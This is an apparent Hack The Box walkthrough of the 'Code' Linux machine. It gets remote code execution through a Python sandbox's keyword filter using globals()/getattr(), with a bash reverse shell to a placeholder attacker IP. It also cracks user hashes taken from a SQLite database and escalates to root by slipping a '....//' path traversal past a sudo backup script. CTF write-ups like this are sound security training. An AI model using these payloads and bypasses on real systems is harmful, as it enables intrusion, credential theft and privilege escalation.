---
tags:
  - HTB
  - Linux
  - Easy
  - RCE
  - Leakage
  - Brute-Force
  - Sudo
---
https://app.hackthebox.com/machines/Code/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.11.62 code.htb
```
# Scanning
```console
$ nmap -p22,5000 -sV -sC code.htb

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The service at port 5000 is a website containing a Python code editor, where you can submit Python code and run it online.
# Enumeration
Using [Caido](https://caido.io/), we found out that the process to execute Python code is:
- The client sends a POST request to `/run_code` parsing the desired code as data.
- The server sends back a JSON with the console output.
- The output is rendered into the HTML code.

Example of Python RCE:
```console
$ curl -s -X POST --data-urlencode "code=print(1)" http://code.htb:5000/run_code

{"output":"1\n"}
```
# Exploitation
Python code with keywords like `builtins`, `import`, `os`, `open`, or `exec` are being blocked:
```console
$ curl -s -X POST --data-urlencode "code=import os" http://code.htb:5000/run_code | jq '.output'

"Use of restricted keywords is not allowed."
```
The `globals()` and `getattr()` functions are not being blocked:
```console
$ curl -s -X POST --data-urlencode "code=globals(); getattr()" http://code.htb:5000/run_code | jq '.output'

"getattr expected at least 2 arguments, got 0"
```
The `os` module is already being loaded:
```console
$ curl -s -X POST --data-urlencode "code=print(globals().keys())" http://code.htb:5000/run_code | jq '.output'

"dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'Flask', 'render_template', 'render_template_string', 'request', 'jsonify', 'redirect', 'url_for', 'session', 'flash', 'SQLAlchemy', 'sys', 'io', 'os', 'hashlib', 'app', 'db', 'User', 'Code', 'index', 'register', 'login', 'logout', 'run_code', 'load_code', 'save_code', 'codes', 'about'])\n"
```
Construct a Python payload without using filtered keywords to execute the `os.system()` function using `globals()` and `getattr()` to get a reverse shell. Save it as `payload.py`:
```python
o = globals().get('o'+'s')
s = getattr(o, 'sy'+'stem' )
s("bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'")
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Get a reverse shell:
```bash
curl -s -X POST -d "code=$(urlencode < payload.py)" http://code.htb:5000/run_code
```
Get the **user flag**:
```bash
cat /home/app-production/user.txt
```
# Post-Exploitation
## User migration
Found **user martin**:
```console
$ whoami
app-production

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
app-production:x:1001:1001:,,,:/home/app-production:/bin/bash
martin:x:1000:1000:,,,:/home/martin:/bin/bash
```
Extract credentials from SQLite3 database:
```console
$ sqlite3 /home/app-production/app/instance/database.db

sqlite> .tables
code  user

sqlite> SELECT * FROM user;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be

sqlite> .exit
```
Cracked **martin** password using [Crackstation](https://crackstation.net/): `nafeelswordsmaster`.

Connect as **martin** via SSH:
```bash
ssh martin@code.htb
```
## Backup script
The script `/usr/bin/backy.sh` can be run with **sudo privileges**:
```console
$ sudo -l

Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```
Looks like the script `/usr/bin/backy.sh` filters some parameters and passes them to the binary `/usr/bin/backy`:
```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
The binary `/usr/bin/backy` needs a JSON instructions file in order to backup a directory. It seems that at some point, the binary was executed to generate a `.tar.bz2` backup of `/home/app-production/app/` inside `/home/martin/backups`:
```console
$ ls /home/martin/backups
code_home_app-production_app_2024_August.tar.bz2  task.json

$ cat /home/martin/backups/task.json
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```
If we can create a backup of the `/root` directory, we could get the **root flag**. However, `/usr/bin/backy.sh` only accepts directories under `/var/` and `/home/`, and directory path traversal is being filtered by the following line:
```bash
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```
As we can see, the previous line removes `../` from each directory. However, if we remove `../` from `/home/....//root`, we get `/home/../root` which essentially targets the `/root` directory. So, now we can modify the JSON file to bypass the filters:
```json
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": true,
	"directories_to_archive": [
		"/home/....//root/"
	]
}
```
Now, we backup the `/root` directory and extract the folder contents:
```console
$ cd /home/martin/backups/

$ sudo /usr/bin/backy.sh /home/martin/backups/task.json

$ bzip2 -d code_home_.._root_2025_July.tar.bz2

$ tar -xf code_home_.._root_2025_July.tar

$ cd root/
```
Now, inside the root backup folder we just created, we could get the private SSH key of the **root user** or we can just get the **root flag**:
```bash
cat root.txt
```